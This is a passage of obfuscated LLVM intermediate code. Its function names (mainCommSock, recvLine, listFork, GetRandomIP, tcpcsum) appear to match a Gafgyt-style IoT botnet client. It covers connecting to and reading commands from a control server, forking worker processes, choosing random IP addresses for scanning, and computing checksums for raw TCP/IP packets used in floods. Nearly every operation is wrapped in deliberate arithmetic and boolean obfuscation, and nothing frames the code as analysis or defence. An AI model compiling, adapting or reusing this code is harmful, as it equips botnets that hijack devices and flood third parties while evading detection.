  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %112

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #13
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %110

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #2, !srcloc !1
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = and i64 %88, %82
  %90 = xor i64 %88, %82
  %91 = or i64 %89, %90
  %92 = or i64 %88, %82
  store i64 %91, i64* %87, align 8
  %93 = load i32, i32* %6, align 4
  %94 = add i32 %93, -1403437129
  %95 = add i32 %94, 1
  %96 = sub i32 %95, -1403437129
  %97 = add nsw i32 %93, 1
  %98 = call i32 @select(i32 %96, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %108

; <label>:100:                                    ; preds = %78
  store i32 4, i32* %13, align 4
  %101 = load i32, i32* %6, align 4
  %102 = bitcast i32* %14 to i8*
  %103 = call i32 @getsockopt(i32 %101, i32 1, i32 4, i8* %102, i32* %13) #2
  %104 = load i32, i32* %14, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %100
  store i32 0, i32* %5, align 4
  br label %128

; <label>:107:                                    ; preds = %100
  br label %109

; <label>:108:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %128

; <label>:109:                                    ; preds = %107
  br label %111

; <label>:110:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %128

; <label>:111:                                    ; preds = %109
  br label %112

; <label>:112:                                    ; preds = %111, %52
  %113 = load i32, i32* %6, align 4
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null)
  %115 = sext i32 %114 to i64
  store i64 %115, i64* %15, align 8
  %116 = load i64, i64* %15, align 8
  %117 = xor i64 %116, -1
  %118 = xor i64 -2049, -1
  %119 = xor i64 -2195743116532276879, -1
  %120 = or i64 %117, %118
  %121 = or i64 -2195743116532276879, %119
  %122 = xor i64 %120, -1
  %123 = and i64 %122, %121
  %124 = and i64 %116, -2049
  store i64 %123, i64* %15, align 8
  %125 = load i32, i32* %6, align 4
  %126 = load i64, i64* %15, align 8
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %125, i32 4, i64 %126)
  store i32 1, i32* %5, align 4
  br label %128

; <label>:128:                                    ; preds = %112, %110, %108, %106, %51
  %129 = load i32, i32* %5, align 4
  ret i32 %129
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %27

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = and i64 %16, %22
  %24 = xor i64 %16, %22
  %25 = or i64 %23, %24
  %26 = or i64 %16, %22
  store i64 %25, i64* %3, align 8
  br label %4

; <label>:27:                                     ; preds = %12
  %28 = load i64, i64* %3, align 8
  ret i64 %28
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %94 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %57
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %126

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, true
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = xor i1 true, true
  %50 = and i1 %49, true
  %51 = and i1 true, %47
  %52 = or i1 %46, %48
  %53 = or i1 %50, %51
  %54 = xor i1 %52, %53
  %55 = xor i1 %44, true
  %56 = zext i1 %54 to i32
  store i32 %56, i32* %3, align 4
  br label %126

; <label>:57:                                     ; preds = %2
  %58 = load i8*, i8** %5, align 8
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %80

; <label>:62:                                     ; preds = %57
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8*, i8** %5, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = call i32 @wildString(i8* %64, i8* %66)
  %68 = icmp ne i32 %67, 0
  %69 = xor i1 %68, true
  %70 = and i1 false, %69
  %71 = xor i1 false, true
  %72 = and i1 %68, %71
  %73 = xor i1 true, true
  %74 = and i1 %73, false
  %75 = and i1 true, %71
  %76 = or i1 %70, %72
  %77 = or i1 %74, %75
  %78 = xor i1 %76, %77
  %79 = xor i1 %68, true
  br label %80

; <label>:80:                                     ; preds = %62, %57
  %81 = phi i1 [ false, %57 ], [ %78, %62 ]
  %82 = xor i1 %81, true
  %83 = and i1 false, %82
  %84 = xor i1 false, true
  %85 = and i1 %81, %84
  %86 = xor i1 true, true
  %87 = and i1 %86, false
  %88 = and i1 true, %84
  %89 = or i1 %83, %85
  %90 = or i1 %87, %88
  %91 = xor i1 %89, %90
  %92 = xor i1 %81, true
  %93 = zext i1 %91 to i32
  store i32 %93, i32* %3, align 4
  br label %126

; <label>:94:                                     ; preds = %2
  %95 = load i8*, i8** %4, align 8
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = call i32 @toupper(i32 %97) #10
  %99 = load i8*, i8** %5, align 8
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = call i32 @toupper(i32 %101) #10
  %103 = icmp eq i32 %98, %102
  br i1 %103, label %104, label %117

; <label>:104:                                    ; preds = %94
  %105 = load i8*, i8** %4, align 8
  %106 = getelementptr inbounds i8, i8* %105, i64 1
  %107 = load i8*, i8** %5, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i32 @wildString(i8* %106, i8* %108)
  %110 = icmp ne i32 %109, 0
  %111 = xor i1 %110, true
  %112 = and i1 true, %111
  %113 = xor i1 true, true
  %114 = and i1 %110, %113
  %115 = or i1 %112, %114
  %116 = xor i1 %110, true
  br label %117

; <label>:117:                                    ; preds = %104, %94
  %118 = phi i1 [ false, %94 ], [ %115, %104 ]
  %119 = xor i1 %118, true
  %120 = and i1 true, %119
  %121 = xor i1 true, true
  %122 = and i1 %118, %121
  %123 = or i1 %120, %122
  %124 = xor i1 %118, true
  %125 = zext i1 %123 to i32
  store i32 %125, i32* %3, align 4
  br label %126

; <label>:126:                                    ; preds = %117, %80, %43, %9
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %27

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 %12, -159723920
  %14 = add i32 %13, 65
  %15 = add i32 %14, -159723920
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 0, 1
  %25 = sub i32 %23, %24
  %26 = add nsw i32 %23, 1
  store i32 %25, i32* %5, align 4
  br label %6

; <label>:27:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %48, 1
  %54 = call i32 @select(i32 %52, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %54, i32* %12, align 4
  %55 = icmp sle i32 %54, 0
  br i1 %55, label %56, label %105

; <label>:56:                                     ; preds = %33
  br label %57

; <label>:57:                                     ; preds = %96, %56
  %58 = load i32, i32* %13, align 4
  %59 = icmp slt i32 %58, 10
  br i1 %59, label %60, label %104

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0))
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %63, align 8
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %64, align 8
  br label %65

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %67 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 0
  %68 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %67) #2, !srcloc !3
  %69 = extractvalue { i64, i64* } %68, 0
  %70 = extractvalue { i64, i64* } %68, 1
  %71 = trunc i64 %69 to i32
  store i32 %71, i32* %14, align 4
  %72 = ptrtoint i64* %70 to i64
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %15, align 4
  br label %74

; <label>:74:                                     ; preds = %65
  %75 = load i32, i32* %5, align 4
  %76 = srem i32 %75, 64
  %77 = zext i32 %76 to i64
  %78 = shl i64 1, %77
  %79 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %80 = load i32, i32* %5, align 4
  %81 = sdiv i32 %80, 64
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [16 x i64], [16 x i64]* %79, i64 0, i64 %82
  %84 = load i64, i64* %83, align 8
  %85 = and i64 %84, %78
  %86 = xor i64 %84, %78
  %87 = or i64 %85, %86
  %88 = or i64 %84, %78
  store i64 %87, i64* %83, align 8
  %89 = load i32, i32* %5, align 4
  %90 = sub i32 %89, -2127035210
  %91 = add i32 %90, 1
  %92 = add i32 %91, -2127035210
  %93 = add nsw i32 %89, 1
  %94 = call i32 @select(i32 %92, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %94, i32* %12, align 4
  %95 = icmp sle i32 %94, 0
  br i1 %95, label %96, label %103

; <label>:96:                                     ; preds = %74
  %97 = load i32, i32* %13, align 4
  %98 = sub i32 0, %97
  %99 = sub i32 0, 1
  %100 = add i32 %98, %99
  %101 = sub i32 0, %100
  %102 = add nsw i32 %97, 1
  store i32 %101, i32* %13, align 4
  br label %57

; <label>:103:                                    ; preds = %74
  br label %104

; <label>:104:                                    ; preds = %103, %57
  br label %105

; <label>:105:                                    ; preds = %104, %33
  store i32 0, i32* %18, align 4
  %106 = load i8*, i8** %6, align 8
  store i8* %106, i8** %17, align 8
  br label %107

; <label>:107:                                    ; preds = %127, %105
  %108 = load i32, i32* %7, align 4
  %109 = sub i32 0, -1
  %110 = sub i32 %108, %109
  %111 = add nsw i32 %108, -1
  store i32 %110, i32* %7, align 4
  %112 = icmp sgt i32 %108, 1
  br i1 %112, label %113, label %132

; <label>:113:                                    ; preds = %107
  %114 = load i32, i32* @mainCommSock, align 4
  %115 = call i64 @recv(i32 %114, i8* %16, i64 1, i32 0)
  %116 = icmp ne i64 %115, 1
  br i1 %116, label %117, label %119

; <label>:117:                                    ; preds = %113
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  store i32 -1, i32* %4, align 4
  br label %135

; <label>:119:                                    ; preds = %113
  %120 = load i8, i8* %16, align 1
  %121 = load i8*, i8** %17, align 8
  %122 = getelementptr inbounds i8, i8* %121, i32 1
  store i8* %122, i8** %17, align 8
  store i8 %120, i8* %121, align 1
  %123 = load i8, i8* %16, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 10
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %119
  br label %132

; <label>:127:                                    ; preds = %119
  %128 = load i32, i32* %18, align 4
  %129 = sub i32 0, 1
  %130 = sub i32 %128, %129
  %131 = add nsw i32 %128, 1
  store i32 %130, i32* %18, align 4
  br label %107

; <label>:132:                                    ; preds = %126, %107
  %133 = load i8*, i8** %17, align 8
  store i8 0, i8* %133, align 1
  %134 = load i32, i32* %18, align 4
  store i32 %134, i32* %4, align 4
  br label %135

; <label>:135:                                    ; preds = %132, %117
  %136 = load i32, i32* %4, align 4
  ret i32 %136
}

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %60

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 6737283200548990171
  %13 = add i64 %12, 1
  %14 = sub i64 %13, 6737283200548990171
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 0, 1
  %18 = sub i64 %16, %17
  %19 = add i64 %16, 1
  %20 = mul i64 %18, 4
  %21 = call noalias i8* @malloc(i64 %20) #2
  %22 = bitcast i8* %21 to i32*
  store i32* %22, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %23

; <label>:23:                                     ; preds = %42, %10
  %24 = load i32, i32* %4, align 4
  %25 = zext i32 %24 to i64
  %26 = load i64, i64* @numpids, align 8
  %27 = sub i64 %26, -3672705929698527387
  %28 = sub i64 %27, 1
  %29 = add i64 %28, -3672705929698527387
  %30 = sub i64 %26, 1
  %31 = icmp ult i64 %25, %29
  br i1 %31, label %32, label %47

; <label>:32:                                     ; preds = %23
  %33 = load i32*, i32** @pids, align 8
  %34 = load i32, i32* %4, align 4
  %35 = zext i32 %34 to i64
  %36 = getelementptr inbounds i32, i32* %33, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = load i32*, i32** %3, align 8
  %39 = load i32, i32* %4, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds i32, i32* %38, i64 %40
  store i32 %37, i32* %41, align 4
  br label %42

; <label>:42:                                     ; preds = %32
  %43 = load i32, i32* %4, align 4
  %44 = sub i32 0, 1
  %45 = sub i32 %43, %44
  %46 = add i32 %43, 1
  store i32 %45, i32* %4, align 4
  br label %23

; <label>:47:                                     ; preds = %23
  %48 = load i32, i32* %2, align 4
  %49 = load i32*, i32** %3, align 8
  %50 = load i64, i64* @numpids, align 8
  %51 = sub i64 %50, 6313178057093304229
  %52 = sub i64 %51, 1
  %53 = add i64 %52, 6313178057093304229
  %54 = sub i64 %50, 1
  %55 = getelementptr inbounds i32, i32* %49, i64 %53
  store i32 %48, i32* %55, align 4
  %56 = load i32*, i32** @pids, align 8
  %57 = bitcast i32* %56 to i8*
  call void @free(i8* %57) #2
  %58 = load i32*, i32** %3, align 8
  store i32* %58, i32** @pids, align 8
  %59 = load i32, i32* %2, align 4
  store i32 %59, i32* %1, align 4
  br label %60

; <label>:60:                                     ; preds = %47, %8
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -1, %14
  %16 = xor i32 -1, -1
  %17 = and i32 %13, %16
  %18 = or i32 %15, %17
  %19 = xor i32 %13, -1
  %20 = xor i32 %12, -1
  %21 = xor i32 %18, -1
  %22 = xor i32 -985908900, -1
  %23 = or i32 %20, %21
  %24 = or i32 -985908900, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %12, %18
  %28 = xor i32 %11, -1
  %29 = and i32 1414323211, %28
  %30 = xor i32 1414323211, -1
  %31 = and i32 %11, %30
  %32 = xor i32 %26, -1
  %33 = and i32 %32, 1414323211
  %34 = and i32 %26, %30
  %35 = or i32 %29, %31
  %36 = or i32 %33, %34
  %37 = xor i32 %35, %36
  %38 = xor i32 %11, %26
  ret i32 %37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %23

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %13
  %16 = sub i64 %14, %15
  %17 = add i64 %14, %13
  store i64 %16, i64* %5, align 8
  %18 = load i32, i32* %4, align 4
  %19 = add i32 %18, 299329088
  %20 = sub i32 %19, 2
  %21 = sub i32 %20, 299329088
  %22 = sub nsw i32 %18, 2
  store i32 %21, i32* %4, align 4
  br label %6

; <label>:23:                                     ; preds = %6
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 0
  br i1 %25, label %26, label %35

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %3, align 8
  %28 = bitcast i16* %27 to i8*
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i64
  %31 = load i64, i64* %5, align 8
  %32 = sub i64 0, %30
  %33 = sub i64 %31, %32
  %34 = add i64 %31, %30
  store i64 %33, i64* %5, align 8
  br label %35

; <label>:35:                                     ; preds = %26, %23
  br label %36

; <label>:36:                                     ; preds = %40, %35
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %57

; <label>:40:                                     ; preds = %36
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = xor i64 65535, -1
  %44 = xor i64 -6477532396814192906, -1
  %45 = or i64 %42, %43
  %46 = or i64 -6477532396814192906, %44
  %47 = xor i64 %45, -1
  %48 = and i64 %47, %46
  %49 = and i64 %41, 65535
  %50 = load i64, i64* %5, align 8
  %51 = lshr i64 %50, 16
  %52 = sub i64 0, %48
  %53 = sub i64 0, %51
  %54 = add i64 %52, %53
  %55 = sub i64 0, %54
  %56 = add i64 %48, %51
  store i64 %55, i64* %5, align 8
  br label %36

; <label>:57:                                     ; preds = %36
  %58 = load i64, i64* %5, align 8
  %59 = xor i64 %58, -1
  %60 = and i64 -1, %59
  %61 = xor i64 -1, -1
  %62 = and i64 %58, %61
  %63 = or i64 %60, %62
  %64 = xor i64 %58, -1
  %65 = trunc i64 %63 to i16
  ret i16 %65
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
